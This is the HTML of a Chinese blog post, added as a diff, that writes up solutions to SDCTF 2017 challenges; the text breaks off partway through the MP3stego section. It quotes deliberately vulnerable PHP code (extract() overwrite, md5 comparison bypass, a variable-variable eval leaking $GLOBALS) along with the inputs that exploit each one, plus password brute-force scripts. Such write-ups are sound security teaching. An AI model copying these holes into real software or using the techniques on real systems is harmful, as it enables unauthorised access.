@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            SDCTF | 
+        
+        Righteous
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" itemprop="description" content="Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
+">
+    <meta name="keywords" content=",CTF">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="Righteous">
+    <meta name="msapplication-starturl" content="http://righte0us.cc/2017/04/08/SDCTF/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="Righteous">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://righte0us.cc/2017/04/08/SDCTF/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="SDCTF | Righteous">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content="Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
+">
+    <meta property="og:article:tag" content="CTF"> 
+
+    
+        <meta property="article:published_time" content="Sat Apr 08 2017 13:31:48 GMT+0800">
+        <meta property="article:modified_time" content="Sun Jun 04 2017 13:47:28 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://righte0us.cc/2017/04/08/SDCTF/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://righte0us.cc/2017/04/08/SDCTF/index.html",
+    "headline": "SDCTF",
+    "datePublished": "Sat Apr 08 2017 13:31:48 GMT+0800",
+    "dateModified": "Sun Jun 04 2017 13:47:28 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "Righteous",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "Righteous",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",CTF",
+    "description": "Webweb100 查看源码，发现extract函数，提交覆盖
+SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
+ if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&amp;gt;
+",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text"><a href="#Web" class="headerlink" title="Web"></a>Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web100"><span class="post-toc-number">1.1.</span> <span class="post-toc-text"><a href="#web100" class="headerlink" title="web100"></a>web100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web300"><span class="post-toc-number">1.2.</span> <span class="post-toc-text"><a href="#web300" class="headerlink" title="web300"></a>web300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web400"><span class="post-toc-number">1.3.</span> <span class="post-toc-text"><a href="#web400" class="headerlink" title="web400"></a>web400</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc"><span class="post-toc-number">2.</span> <span class="post-toc-text"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc200"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mice200-Combine"><span class="post-toc-number">2.2.</span> <span class="post-toc-text"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc300"><span class="post-toc-number">2.3.</span> <span class="post-toc-text"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc500-MP3stego"><span class="post-toc-number">2.4.</span> <span class="post-toc-text"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Crypto"><span class="post-toc-number">3.</span> <span class="post-toc-text"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto200-Knock"><span class="post-toc-number">3.1.</span> <span class="post-toc-text"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto300-MD5"><span class="post-toc-number">3.2.</span> <span class="post-toc-text"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto500-RSA"><span class="post-toc-number">3.3.</span> <span class="post-toc-text"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Bin"><span class="post-toc-number">4.</span> <span class="post-toc-text"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Bin300-RC4"><span class="post-toc-number">4.1.</span> <span class="post-toc-text"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Bin500-PwnPwnPwn"><span class="post-toc-number">4.2.</span> <span class="post-toc-text"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</span></a></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                SDCTF
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>Righteous</strong>
+        <span>4月 08, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/CTF/">CTF</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=SDCTF&url=http://righte0us.cc/2017/04/08/SDCTF/index.html&pic=http://righte0us.cc/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=SDCTF&url=http://righte0us.cc/2017/04/08/SDCTF/index.html&via=Righteous" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://righte0us.cc/2017/04/08/SDCTF/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://righte0us.cc/2017/04/08/SDCTF/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p> 查看源码，发现extract函数，提交覆盖</p>
+<pre><code>SDPC ==&gt;aaaaa&lt;br&gt;password ==&gt;sdpcsdpcsdpc&lt;br&gt;&lt;!--
+ if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {?&gt;
+     extract($_POST);
+ if ($SDPC == $password) { 
+     echo $key;
+--&gt;
+</code></pre><a id="more"></a>
+<p><img src="/images/sdctf/1.png" alt=""></p>
+<p>Flag:SDCTF{244fcba2093a5c942ee11f0f3f28f21f}</p>
+<h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p> 发现.git,访问发现aaa.php</p>
+<p><img src="/images/sdctf/2.png" alt=""></p>
+<pre><code>if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) { 
+   if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;]) 
+      if (md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) 
+         die(&apos;Flag: &apos;.$flag); 
+      else 
+         print &apos;Wrong.&apos;; }
+</code></pre><p><img src="/images/sdctf/3.png" alt=""><br>Flag: SDCTF{44224d27bfe875886f4b7247e16e48f8}</p>
+<h2 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h2><p>打开题目我们直接就看到源码，加上注释如下</p>
+<pre><code>&lt;?php
+$SDPC = @$_REQUEST[&apos;hello&apos;];     //$SDPC这个变量请求变量hello的值
+if(!preg_match(&apos;/^\w*$/&apos;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。
+die(&apos;ERROR&apos;);//不匹配则输出ERROR
+}
+eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
+</code></pre><p>而且通过题目链接可以知道hello变量一定是6位的，一开始真以为是爆破了，但是一想肯定很大，不可能。而且我们发现 $$a 这个东西很诡异。其实就是PHP中变量可以当作另一个变量的变量名。例如</p>
+<pre><code>&lt;?php
+ $a=&apos;b&apos;;
+ $b=&quot;hello world!&quot;;
+ eval(&quot;var_dump($$a);&quot;);
+?&gt;
+</code></pre><p>上面代码会输出hello world!<br>PHP一个比较有意思的变量!$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>于是我们在url上构造/?hello=GLOBALS<br><img src="/images/sdctf/4.png" alt=""><br>Flag:SDCTF{f60eeabd0af6a908512983d844c00523}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h2><p>通过即得flag<br><img src="/images/sdctf/5.png" alt=""><br>修改存档</p>
+<p><img src="/images/sdctf/6.png" alt=""></p>
+<p><img src="/images/sdctf/7.png" alt=""></p>
+<h2 id="Mice200-Combine"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</h2><p>将下载的zip文件进行解压，里面有32个小文件，每个文件中是一个数字，给人感觉就是这个是ASCII值。将所有文件中的文本按照1，10，11，12……的顺序合并到一个文件中：</p>
+<pre><code>cat crypto2/* &gt; 1.txt
+</code></pre><p>然后转换成对应字符串:</p>
+<p><img src="/images/sdctf/8.png" alt=""> </p>
+<p>Flag:SDCTF{c5d3effc5u7bedw217e7ndPecf60b5}</p>
+<h2 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h2><p>rar爆破(pass:0522)，得到1.jpg，steghide隐写，解之得到FLAG.txt</p>
+<p><img src="/images/sdctf/9.png" alt=""></p>
+<p>Flag:SDCTF{25861b2471456810bea272fd666a8b79}</p>
+<h2 id="Misc500-MP3stego"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</h2><p>根据RGB生成二维码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">280</span></span><br><span class="line">y = <span class="number">280</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"QR.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">rgbinfo = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">c = Image.new(<span class="string">"RGB"</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">      rgb = rgbinfo[i * y + j].split(<span class="string">","</span>)</span><br><span class="line">      c.putpixel([i, j],(int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">c.show()</span><br></pre></td></tr></table></figure>
+<p>得到：MP3stego的密码在1000-1300之间。</p>
+<p>生成字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f =open(&apos;pwd.txt&apos;,&apos;a&apos;)</span><br><span class="line">line = &apos;&apos;</span><br><span class="line">for i in xrange(1000,1300):</span><br><span class="line">  f.write(line+str(i)+&apos;\n&apos;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>循环爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> open(<span class="string">'pwd.txt'</span>):</span><br><span class="line">   command=<span class="string">'decode -X -P %s mp3.mp3'</span> % a.strip()</span><br><span class="line">   <span class="keyword">print</span> command</span><br><span class="line">   p=subprocess.Popen(command,stdin=subprocess.PIPE,</span><br><span class="line">   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="string">"unexpected end of cipher 